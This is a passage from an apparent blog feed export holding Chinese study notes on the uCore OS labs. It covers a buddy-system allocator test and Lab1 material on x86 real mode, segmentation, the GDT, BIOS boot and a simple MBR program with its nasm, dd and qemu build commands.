32+</span></span><br><span class="line">assert(p0-&gt;property == <span class="number">32</span>);</span><br><span class="line"><span class="comment">// 检测链表顺序是否按照块的大小排序的</span></span><br><span class="line">p0 = alloc_pages(<span class="number">5</span>);</span><br><span class="line">p1 = alloc_pages(<span class="number">16</span>);</span><br><span class="line">free_pages(p1, <span class="number">16</span>);</span><br><span class="line">assert(list_next(&amp;(free_list)) == &amp;((p1 - <span class="number">8</span>)-&gt;page_link));</span><br><span class="line">free_pages(p0, <span class="number">5</span>);</span><br><span class="line">assert(list_next(&amp;(free_list)) == &amp;(p0-&gt;page_link));</span><br><span class="line"></span><br><span class="line">p0 = alloc_pages(<span class="number">5</span>);</span><br><span class="line">p1 = alloc_pages(<span class="number">16</span>);</span><br><span class="line">free_pages(p0, <span class="number">5</span>);</span><br><span class="line">assert(list_next(&amp;(free_list)) == &amp;(p0-&gt;page_link));</span><br><span class="line">free_pages(p1, <span class="number">16</span>);</span><br><span class="line">assert(list_next(&amp;(free_list)) == &amp;(p0-&gt;page_link));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还原</span></span><br><span class="line">p0 = alloc_pages(<span class="number">26</span>);</span><br><span class="line"><span class="comment">//.........................................................</span></span><br></pre></td></tr></table></figure>
<h5 id="6-总结与完整代码">6. 总结与完整代码</h5>
<ul>
<li>
<p><code>buddySystem</code>在<strong>所分配的内存大小均为2的n次幂</strong>这种环境下，使用效果极佳。</p>
</li>
<li>
<p>由于<code>buddySystem</code>的特性，最好使用二叉树而非普通双向链表来管理内存块，这样就可以避免一系列的bug。</p>
<p>即便普通双向链表可以很好的实现<code>buddySystem</code>，但其中仍然存在一个较为麻烦的问题：</p>
<blockquote>
<p><strong>当某个物理块释放，将其插入至双向链表后，如果该物理块既可以和上一个物理块合并，又可以和下一个物理块合并，那么此时该合并哪一个物理块？</strong></p>
</blockquote>
<p>这个问题，双向链表无法很好的解决，该问题很可能会使一些物理块因为错误的合并顺序而最终导致内存的碎片化，降低内存的使用率。</p>
</li>
<li>
<p>完整代码位于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/uCore/os_kernel_lab-master_RAW/labcodes/lab2/kern/mm/buddySystem_pmm.c" target="_blank" rel="noopener">github</a>，如有需要请自取。</p>
</li>
</ul>
<h4 id="Challenge2">Challenge2</h4>
<blockquote>
<p><strong>任意大小的内存单元slub分配算法</strong></p>
<p>slub算法，实现两层架构的高效内存单元分配，第一层是基于页大小的内存分配，第二层是在第一层基础上实现基于任意大小的内存分配。可简化实现，能够体现其主体思想即可。</p>
</blockquote>
<blockquote>
<p>Challenge2 先鸽了，赶进度QWQ</p>
</blockquote>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>uCore</tag>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>uCore实验 - Lab1</title>
    <url>/2020/08/uCore-1/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里是笔者在完成uCore实验1时写下的一点笔记</li>
<li>内容涉及CPU实模式、中断处理以及特权级更改等</li>
<li>内容较多，建议使用右侧导航栏。</li>
</ul>
<a id="more"></a>
<h2 id="知识点">知识点</h2>
<h3 id="1-环境配置">1. 环境配置</h3>
<ul>
<li>执行<code>sudo apt-get install qemu-system</code>，安装qemu程序，为执行uCore做准备</li>
<li>下载该<a href="https://github.com/chyyuu/os_kernel_lab" target="_blank" rel="noopener">github</a>上的<strong>master</strong>分支（注意默认分支不是master分支）的uCore代码，解压使用。</li>
</ul>
<h3 id="2-BIOS中断、DOS中断、Linux中断的区别">2. BIOS中断、DOS中断、Linux中断的区别</h3>
<ul>
<li>BIOS和DOS都存在于实模式下，由它们建立的中断调用都是建立在中断向量表（Interrupt Vector Table，IVT）中的，都是通过软中断指令 int 中断号来调用。</li>
<li>BIOS 中断调用的主要功能是提供了硬件访问的方法，该方法使对硬件的操作变得简单易行。</li>
<li>DOS 是运行在实模式下的，故其建立的中断调用也建立在中断向量表中，只不过其中断向量号和BIOS的不能冲突。</li>
<li>Linux 内核是在进入保护模式后才建立中断例程的，不过在保护模式下，中断向量表已经不存在了，取而代之的是中断描述符表（Interrupt Descriptor Table，IDT）。Linux 的系统调用和DOS中断调用类似，不过Linux是通过<code>int 0x80</code>指令进入一个中断程序后再根据eax寄存器的值来调用不同的子功能函数的。</li>
</ul>
<h3 id="3-操作系统如何识别文件系统">3. 操作系统如何识别文件系统</h3>
<ul>
<li>各分区都有超级块，一般位于本分区的第2个扇区。超级块里面记录了此分区的信息，其中就有文件系统的魔数，一种文件系统对应一个魔数，通过比较即可得知文件系统类型。</li>
</ul>
<h3 id="4-CPU的实模式（重要）">4. CPU的实模式（重要）</h3>
<ul>
<li>
<p>CPU大体上可分为控制单元、运算单元、存储单元</p>
<ul>
<li>控制单元是CPU的控制中心，大致由指令寄存器(IR, Instruction Register)、指令译码器(ID, Instruction Decoder)和操作控制器(OC, Operation Controller)组成。以下是一般的指令格式<br>
<img src="/2020/08/uCore-1/ia32Inst.png" alt="img"></li>
<li>运算单元根据控制单元的信号，进行运算。</li>
<li>存储单元CPU内部的L1、L2缓存及寄存器。这部分缓存采用SRAM存储器。SRAM不需要刷新电路即可保存内部存储的数据，但因为体积较大，集成度较低。</li>
</ul>
</li>
<li>
<p>CPU中的寄存器分为两大类：程序可见寄存器（例如通用寄存器、段寄存器）和程序不可见寄存器（例如中断描述符寄存器IDTR）。<br>
<img src="/2020/08/uCore-1/commonRegister.png" alt="img"></p>
</li>
<li>
<p>实模式的主要特性是：<strong>程序用到的地址都是真实的物理地址</strong>。同时，实模式下的地址寻址空间只有1MB(20bit)</p>
<blockquote>
<p>从intel 80386开始的CPU，只要进入实模式，地址寻址空间就限制在1MB。</p>
</blockquote>
</li>
<li>
<p>实模式下的地址计算方式为<strong>16*段寄存器值+段内偏移地址</strong>，其CPU寻址方式为</p>
<ul>
<li>寄存器寻址</li>
<li>立即数寻址</li>
<li>内存寻址
<ul>
<li>直接寻址。例如<code>mov ax, [0x1234]</code></li>
<li>基址寻址</li>
<li>变址寻址</li>
<li>基址变址寻址</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="a-CPU实模式下的1MB内存">a. CPU实模式下的1MB内存</h4>
<ul>
<li>
<p>CPU初始状态为16位实模式，在实模式下只能访问1MB(20bits)内存。而硬件工程师将1MB的内存空间分成多个部分。<br>
<img src="/2020/08/uCore-1/memmap.png" alt="img"></p>
</li>
<li>
<p>其中地址<code>0-0x9ffff</code>的640KB内存是DRAM，即插在主板上的内存条。<br>
顶部<code>0xf0000-0xfffff</code>的64KB内存是ROM，存放BIOS代码。</p>
<blockquote>
<p>BIOS检测并初始化硬件，同时建立中断向量表，并保证能运行一些基本硬件的IO操作</p>
</blockquote>
</li>
<li>
<p>CPU中，插在主板上的物理内存并不是眼中“全部的内存”。地址总线宽度决定可以访问的内存空间大小。<br>
并不是只有插在主板上的内存条需要通过地址总线访问，还有一些外设同样是需要通过地址总线来访问。<br>
故地址总线上会提前预留出来一些地址空间给这些外设，其余的可用地址再指向DRAM。</p>
</li>
</ul>
<h3 id="5-CPU的分段机制（重要）">5. CPU的分段机制（重要）</h3>
<h4 id="a-内存访问为什么要分段">a. 内存访问为什么要分段</h4>
<ul>
<li>以前程序都是直接访问物理内存，所以编译出的两个程序如果内存冲突，则无法同时运行。</li>
<li>CPU采用“段基址+段内偏移地址”的方式来访问任意内存。好处是程序可以重定位，可以执行多个程序。</li>
<li>段基址不需要得是65536的倍数。</li>
<li>加载用户程序时，只要将整个段的内容复制到新的位置，再将段基址寄存器中的地址改成该地址，程序便可准确无误地运行，因为程序中用的是段内偏移地址。</li>
<li>改变段基址，通过在内存中一个段来回挪位置的方式可以访问到任意内存位置。程序分段可以将大内存分成可以访问的小段，访问到所有内存。</li>
<li>通过分段，在早期CPU实模式16位寄存器的情况下，计算<strong>段基址 &lt;&lt; 4 + 段内偏移地址</strong>，即可访问到20位地址空间。</li>
</ul>
<blockquote>
<p>代码中的分段与CPU的分段不同。编译器负责挑选出数据具备的属性，从而根据属性将程序片段分类，比如划分出了只读属性的代码段和可写属性的数据段。编译器并没有让段具备某种属性，对于代码段，编译器只是将代码归类到一起，并没有为代码段添加额外的信息。</p>
</blockquote>
<ul>
<li><strong>在实模式下，段基址直接写在段寄存器中；而在保护模式下，段寄存器中的不再是段基址，而是段选择子。</strong></li>
<li>分段机涉及4个关键内容：逻辑地址、段描述符（描述段的属性）、段描述符表（包含多个段描述符的“数组”）、段选择子（段寄存器，用于定位段描述符表中表项的索引）。只有在<strong>保护模式</strong>下才能使用分段存储管理机制。</li>
</ul>
<h4 id="b-将逻辑地址转换为物理地址的两步操作">b. 将逻辑地址转换为物理地址的两步操作</h4>
<blockquote>
<p>逻辑地址是程序员能看到的虚拟地址。</p>
</blockquote>
<ul>
<li>分段地址转换：CPU把逻辑地址（由段选择子selector和段偏移offset组成）中的段选择子的内容作为段描述符表的索引，找到表中对应的段描述符，然后把段描述符中保存的段基址加上段偏移值，形成线性地址（Linear Address）。</li>
<li>分页地址转换，这一步中把线性地址转换为物理地址。<br>
<img src="/2020/08/uCore-1/segmentTranslation.png" alt="img"></li>
</ul>
<h4 id="c-段描述符">c. 段描述符</h4>
<ul>
<li>
<p>在分段存储管理机制的保护模式下，每个段由如下三个参数进行定义：段基地址(Base Address)、段界限(Limit)和段属性(Attributes)</p>
<ul>
<li>段基地址：规定线性地址空间中段的起始地址。任何一个段都可以从32位线性地址空间中的任何一个字节开始，不用像实模式下规定边界必须被16整除。</li>
<li>段界限：规定段的大小。可以以字节为单位或以4K字节为单位。</li>
<li>段属性：确定段的各种性质。
<ul>
<li>段属性中的粒度位（Granularity），用符号G标记。G=0表示段界限以字节位位单位，20位的界限可表示的范围是1字节至1M字节，增量为1字节；G=1表示段界限以4K字节为单位，于是20位的界限可表示的范围是4K字节至4G字节，增量为4K字节。</li>
<li>类型（TYPE）：用于区别不同类型的描述符。可表示所描述的段是代码段还是数据段，所描述的段是否可读/写/执行，段的扩展方向等。其4bit从左到右分别是
<ul>
<li>执行位：置1时表示可执行，置0时表示不可执行；</li>
<li>一致位：置1时表示一致码段，置0时表示非一致码段；</li>
<li>读写位：置1时表示可读可写，置0时表示只读；</li>
<li>访问位：置1时表示已访问，置0时表示未访问。</li>
</ul>
</li>
<li>描述符特权级（Descriptor Privilege Level）（DPL）：用来实现保护机制。</li>
<li>段存在位（Segment-Present bit）：如果这一位为0，则此描述符为非法的，不能被用来实现地址转换。如果一个非法描述符被加载进一个段寄存器，处理器会立即产生异常。操作系统可以任意的使用被标识为可用（AVAILABLE）的位。</li>
<li>已访问位（Accessed bit）：当处理器访问该段（当一个指向该段描述符的选择子被加载进一个段寄存器）时，将自动设置访问位。操作系统可清除该位。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>段描述符的格式<br>
<img src="/2020/08/uCore-1/SegmentDescription.png" alt="img"></p>
</li>
<li>
<p>段描述符的结构</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* segment descriptors */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">segdesc</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_lim_15_0 : <span class="number">16</span>;        <span class="comment">// low bits of segment limit</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_base_15_0 : <span class="number">16</span>;        <span class="comment">// low bits of segment base address</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_base_23_16 : <span class="number">8</span>;        <span class="comment">// middle bits of segment base address</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_type : <span class="number">4</span>;            <span class="comment">// segment type (see STS_ constants)</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_s : <span class="number">1</span>;                <span class="comment">// 0 = system, 1 = application</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_dpl : <span class="number">2</span>;            <span class="comment">// descriptor Privilege Level</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_p : <span class="number">1</span>;                <span class="comment">// present</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_lim_19_16 : <span class="number">4</span>;        <span class="comment">// high bits of segment limit</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_avl : <span class="number">1</span>;            <span class="comment">// unused (available for software use)</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_rsv1 : <span class="number">1</span>;            <span class="comment">// reserved</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_db : <span class="number">1</span>;                <span class="comment">// 0 = 16-bit segment, 1 = 32-bit segment</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_g : <span class="number">1</span>;                <span class="comment">// granularity: limit scaled by 4K when set</span></span><br><span class="line">    <span class="keyword">unsigned</span> sd_base_31_24 : <span class="number">8</span>;        <span class="comment">// high bits of segment base address</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="d-全局描述符表">d. 全局描述符表</h4>
<ul>
<li>全局描述符表（GDT）是一个保存多个段描述符的“数组”，其起始地址保存在全局描述符表寄存器GDTR中。GDTR长48位，其中高32位为基地址，低16位为段界限。</li>
<li>全局描述符表的一个demo</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG(type, base, lim, dpl)                        \</span></span><br><span class="line">    (struct segdesc)&#123;                                    \</span><br><span class="line">        ((lim) &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>, (base) &amp; <span class="number">0xffff</span>,        \</span><br><span class="line">        ((base) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>, type, <span class="number">1</span>, dpl, <span class="number">1</span>,            \</span><br><span class="line">        (<span class="keyword">unsigned</span>)(lim) &gt;&gt; <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,                \</span><br><span class="line">        (<span class="keyword">unsigned</span>) (base) &gt;&gt; <span class="number">24</span>                            \</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * Global Descriptor Table:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The kernel and user segments are identical (except for the DPL). To load</span></span><br><span class="line"><span class="comment"> * the %ss register, the CPL must equal the DPL. Thus, we must duplicate the</span></span><br><span class="line"><span class="comment"> * segments for the user and the kernel. Defined as follows:</span></span><br><span class="line"><span class="comment"> *   - 0x0 :  unused (always faults -- for trapping NULL far pointers)</span></span><br><span class="line"><span class="comment"> *   - 0x8 :  kernel code segment</span></span><br><span class="line"><span class="comment"> *   - 0x10:  kernel data segment</span></span><br><span class="line"><span class="comment"> *   - 0x18:  user code segment</span></span><br><span class="line"><span class="comment"> *   - 0x20:  user data segment</span></span><br><span class="line"><span class="comment"> *   - 0x28:  defined for tss, initialized in gdt_init</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">segdesc</span> <span class="title">gdt</span>[] = &#123;</span></span><br><span class="line">    SEG_NULL,</span><br><span class="line">    [SEG_KTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_KDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_UTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_UDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_TSS]    = SEG_NULL,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="e-选择子">e. 选择子</h4>
<ul>
<li>线性地址部分的选择子是用来选择哪个描述符表和在该表中索引哪个描述符的。选择子可以做为指针变量的一部分，从而对应用程序员是可见的，但是一般是由连接加载器来设置的。</li>
<li>段选择子结构
<ul>
<li>索引（Index）：在描述符表中从8192个描述符中选择一个描述符。处理器自动将这个索引值乘以8（描述符的长度），再加上描述符表的基址来索引描述符表，从而选出一个合适的描述符。</li>
<li>表指示位（Table Indicator，TI）：选择应该访问哪一个描述符表。0代表应该访问全局描述符表（GDT），1代表应该访问局部描述符表（LDT）。</li>
<li>请求特权级（Requested Privilege Level，RPL）：保护机制。<br>
<img src="/2020/08/uCore-1/FormatOfSelector.png" alt="img"></li>
</ul>
</li>
<li>全局描述符表的第一个描述符无法被CPU使用，所以当一个段选择子的索引（Index）部分和表指示位（Table Indicator）都为0的时（即段选择子指向全局描述符表的第一项时），可以当做一个空的选择子。当一个段寄存器被加载一个空选择子时，处理器并不会产生一个异常。但是，当用一个空选择子去访问内存时，则会产生异常。</li>
</ul>
<h3 id="6-BIOS是如何苏醒的（重要）">6. BIOS是如何苏醒的（重要）</h3>
<ul>
<li>BIOS代码被写进ROM中，该ROM被映射到低端1M内存的顶部，即地址<code>0xF0000~0xFFFFF</code>。BIOS的入口地址为<code>0xFFFF0</code>。<br>
开机接电的一瞬间，CPU的CS:IP寄存器被强制初始化为<code>0xF000:0xFFF0</code>，即<code>0xFFFF0</code>。<br>
由于实模式下最高寻址1MB，故<code>0xFFFF0</code>处是一条跳转指令<code>jmp far f000:e05b</code>，跳转至BIOS真正的代码。之后便开始检测并初始化外设、与<code>0x000-0x3ff</code>建立数据结构，中断向量表IVT并填写中断例程。</li>
<li>BIOS最后校验启动盘中位于0盘0道1扇区(MBR)的内容。如果此扇区末尾两个字节分别是魔数<code>0x55</code>和<code>0xaa</code>，则BIOS认为此扇区中存在可执行的程序，并加载该512字节数据到<code>0x7c00</code>，随后跳转至此继续执行。使用的跳转指令为<code>jmp 0:0x7c00</code>，该指令是jmp指令的直接绝对远转移用法。
<blockquote>
<p>磁盘与磁道的编号从0开始，扇区编号从1开始。<br>
选择<code>0x7c00</code>是避免覆盖已有的数据以及被其他数据覆盖。</p>
</blockquote>
</li>
</ul>
<h3 id="7-MBR-Bootloader">7. MBR/Bootloader</h3>
<ul>
<li>
<p>bootloader的作用</p>
<ul>
<li>切换保护模式 &amp; 段机制</li>
<li>从硬盘上读取kernel in ELF格式的ucore kernel（跟在MBR后面的扇区），并放到内存中固定。</li>
<li>跳转到ucoreOS的入口点执行，将控制权移交给ucore OS。</li>
</ul>
</li>
<li>
<p>MBR是主引导记录（Master Boot Record），也被称为主引导扇区，是计算机开机以后访问硬盘时所必须要读取的第一个扇区。其内部前446字节存储了bootloader代码，其后是4个16字节的“磁盘分区表”。</p>
<blockquote>
<p>MBR是整个硬盘最重要的区域，一旦MBR物理实体损坏时，则该硬盘基本报废。</p>
</blockquote>
</li>
<li>
<p>bootloader的入口点为<code>0x7c00</code>。以下是一个简单的类MBR程序，该程序只会将<code>1 MBR</code>字符串打印到屏幕上并挂起。通过该程序我们可以对MBR结构有了更深的了解。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">;主引导程序</span></span><br><span class="line"><span class="comment">;------------------------------------------------------------</span></span><br><span class="line"><span class="meta">SECTION</span> MBR vstart=<span class="number">0x7c00</span> <span class="comment">; 起始地址编译为0x7c00</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="built_in">cs</span>   <span class="comment">; 此时的cs为0，用0来初始化所有的段寄存器</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">es</span>,<span class="built_in">ax</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">fs</span>,<span class="built_in">ax</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">0x7c00</span> <span class="comment">; 0x7c00 以下空间暂时安全，故可用做栈。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 清屏 利用0x06号功能，上卷全部行，则可清屏。</span></span><br><span class="line"><span class="comment">; -----------------------------------------------------------</span></span><br><span class="line"><span class="comment">;INT 0x10   功能号:0x06   功能描述:上卷窗口</span></span><br><span class="line"><span class="comment">;------------------------------------------------------</span></span><br><span class="line"><span class="comment">;输入：</span></span><br><span class="line"><span class="comment">;AH 功能号= 0x06</span></span><br><span class="line"><span class="comment">;AL = 上卷的行数(如果为0,表示全部)</span></span><br><span class="line"><span class="comment">;BH = 上卷行属性</span></span><br><span class="line"><span class="comment">;(CL,CH) = 窗口左上角的(X,Y)位置</span></span><br><span class="line"><span class="comment">;(DL,DH) = 窗口右下角的(X,Y)位置</span></span><br><span class="line"><span class="comment">;无返回值：</span></span><br><span class="line">  <span class="keyword">mov</span>     <span class="built_in">ax</span>, <span class="number">0x600</span></span><br><span class="line">  <span class="keyword">mov</span>     <span class="built_in">bx</span>, <span class="number">0x700</span></span><br><span class="line">  <span class="keyword">mov</span>     <span class="built_in">cx</span>, <span class="number">0</span>          <span class="comment">; 左上角: (0, 0)</span></span><br><span class="line">  <span class="keyword">mov</span>     <span class="built_in">dx</span>, <span class="number">0x184f</span>     <span class="comment">; 右下角: (80,25),</span></span><br><span class="line">        <span class="comment">; VGA文本模式中,一行只能容纳80个字符,共25行。</span></span><br><span class="line">        <span class="comment">; 下标从0开始,所以0x18=24,0x4f=79</span></span><br><span class="line">  <span class="keyword">int</span>     <span class="number">0x10</span>            <span class="comment">; int 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;;;;;;;;;    下面这三行代码是获取光标位置    ;;;;;;;;;</span></span><br><span class="line"><span class="comment">;.get_cursor获取当前光标位置,在光标位置处打印字符.</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">3</span>   <span class="comment">; 输入: 3 号子功能是获取光标位置,需要存入ah寄存器</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="number">bh</span>, <span class="number">0</span>   <span class="comment">; bh寄存器存储的是待获取光标的页号</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> <span class="number">0x10</span>    <span class="comment">; 输出: ch=光标开始行,cl=光标结束行</span></span><br><span class="line">      <span class="comment">; dh=光标所在行号,dl=光标所在列号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;;;;;;;;;    获取光标位置结束    ;;;;;;;;;;;;;;;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;;;;;;;;;     打印字符串    ;;;;;;;;;;;</span></span><br><span class="line">  <span class="comment">;还是用10h中断,不过这次是调用13号子功能打印字符串</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ax</span>, message</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">bp</span>, <span class="built_in">ax</span>    <span class="comment">; es:bp 为串首地址, es此时同cs一致，</span></span><br><span class="line">      <span class="comment">; 开头时已经为sreg初始化</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">; 光标位置要用到dx寄存器中内容,cx中的光标位置可忽略</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">5</span>   <span class="comment">; cx 为串长度,不包括结束符0的字符个数</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0x1301</span>  <span class="comment">; 子功能号13是显示字符及属性,要存入ah寄存器,</span></span><br><span class="line">      <span class="comment">; al设置写字符方式 ah=01: 显示字符串,光标跟随移动</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0x2</span> <span class="comment">; bh存储要显示的页号,此处是第0页,</span></span><br><span class="line">      <span class="comment">; bl中是字符属性, 属性黑底绿字(bl = 02h)</span></span><br><span class="line">  <span class="keyword">int</span> <span class="number">0x10</span>    <span class="comment">; 执行BIOS 0x10 号中断</span></span><br><span class="line"><span class="comment">;;;;;;;;;      打字字符串结束 ;;;;;;;;;;;;;;;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">jmp</span> $   <span class="comment">; 始终跳转到这条代码，为死循环，使程序悬停在此</span></span><br><span class="line"></span><br><span class="line">  message <span class="built_in">db</span> <span class="string">"1 MBR"</span></span><br><span class="line">  <span class="comment">; 用\0 将剩余空间填满</span></span><br><span class="line">  <span class="built_in">times</span> <span class="number">510</span>-($-$$) <span class="built_in">db</span> <span class="number">0</span> <span class="comment">; $指代当前指令的地址，$$指代当前section的首地址</span></span><br><span class="line">  <span class="comment">; 最后两位一定是0x55, 0xaa</span></span><br><span class="line">  <span class="built_in">db</span> <span class="number">0x55</span>,<span class="number">0xaa</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>程序在section处使用了<code>vstart</code>伪指令。该指令只要求编译器将后面的所有数据与变量的地址以0x7c00开始编址，并不负责加载。而加载是由MBR加载器将该程序加载到0x7c00处。</p>
</li>
<li>
<p>执行以下代码，即可看到程序输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译汇编代码</span></span><br><span class="line">nasm mbr.asm -o mbr.bin</span><br><span class="line"><span class="comment"># 制作img镜像。注意dd指令的复制操作与cp不一样，它是针对磁盘来进行的复制</span></span><br><span class="line"><span class="comment">#   将编译出的mbr.bin写进mbr.img中的第0块</span></span><br><span class="line">dd <span class="keyword">if</span>=mbr.bin of=mbr.img bs=512 count=1 conv=notrunc</span><br><span class="line"><span class="comment"># 使用i386架构启动mbr.img</span></span><br><span class="line">qemu-system-i386 mbr.img</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/uCore-1/1mbr.png" alt="img"></p>
</li>
</ul>
<h3 id="8-硬件访问">8. 硬件访问</h3>
<ul>
<li>
<p>硬件提供了软件方面的接口，操作系统通过软件（计算机指令）就能控制硬件。软件的逻辑需要作用在硬件上才能体现出来。</p>
</li>
<li>
<p>硬件在输出上大体分为串行和并行，相应的接口是串行接口和并行接口。</p>
</li>
<li>
<p>访问外部硬件的两种方式</p>
<ul>
<li>将某个外设的内存映射到一定范围内的地址空间。例如显卡。显卡是显示器的适配器，CPU 不直接和显示器交互，它只和显卡通信。其中的显存被映射到主机物理内存上的低端1MB的<code>0xB8000~0xBFFFF</code>。CPU往显存上写字节便是往屏幕上打印内容。显存地址分布如下<br>
<img src="/2020/08/uCore-1/ncardaddress.png" alt="img"></li>
<li>通过IO接口。CPU只访问IO接口，不关心另一边的外设。IO接口上也存在一些寄存器。
<ul>
<li>
<p>CPU使用IO接口与外设通信。IO接口是连接CPU与外部设备的逻辑控制部件，可分为硬件软件两部分。</p>
</li>
<li>
<p>计算机与IO接口的通信是通过计算机指令来实现的。通过软件指令选择IO接口上的功能、工作模式的做法，称为“IO接口控制编程”，通常是用端口读写指令in/out实现。端口是IO接口开发给CPU的接口，一般的IO接口都有一组端口，每个端口都有自己的用途。<code>in/out</code>指令使用方式如下。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span> <span class="built_in">al</span>, <span class="built_in">dx</span>  # <span class="built_in">al</span>/<span class="built_in">ax</span> 用于存放从端口读入的数据，<span class="built_in">dx</span>指端口号</span><br><span class="line"><span class="keyword">in</span> <span class="built_in">ax</span>, <span class="built_in">dx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">out</span> <span class="built_in">dx</span>, <span class="built_in">al</span></span><br><span class="line"><span class="keyword">out</span> <span class="built_in">dx</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">out</span> 立即数, <span class="built_in">al</span></span><br><span class="line"><span class="keyword">out</span> 立即数, <span class="built_in">ax</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>例子：直接向显卡中写入数据</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">;主引导程序</span></span><br><span class="line"><span class="comment">;------------------------------------------------------------</span></span><br><span class="line"><span class="meta">SECTION</span> MBR vstart=<span class="number">0x7c00</span> <span class="comment">; 起始地址编译为0x7c00</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="built_in">cs</span>   <span class="comment">; 此时的cs为0，用0来初始化所有的段寄存器</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">es</span>,<span class="built_in">ax</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">fs</span>,<span class="built_in">ax</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">0x7c00</span> <span class="comment">; 0x7c00 以下空间暂时安全，故可用做栈。</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">0xb800</span> <span class="comment">; 0xb800-0xbffff 用于文本模式显示适配器</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">gs</span>,<span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 清屏 利用0x06号功能，上卷全部行，则可清屏。</span></span><br><span class="line"><span class="comment">; -----------------------------------------------------------</span></span><br><span class="line"><span class="comment">;INT 0x10   功能号:0x06   功能描述:上卷窗口</span></span><br><span class="line"><span class="comment">;------------------------------------------------------</span></span><br><span class="line"><span class="comment">;输入：</span></span><br><span class="line"><span class="comment">;AH 功能号= 0x06</span></span><br><span class="line"><span class="comment">;AL = 上卷的行数(如果为0,表示全部)</span></span><br><span class="line"><span class="comment">;BH = 上卷行属性</span></span><br><span class="line"><span class="comment">;(CL,CH) = 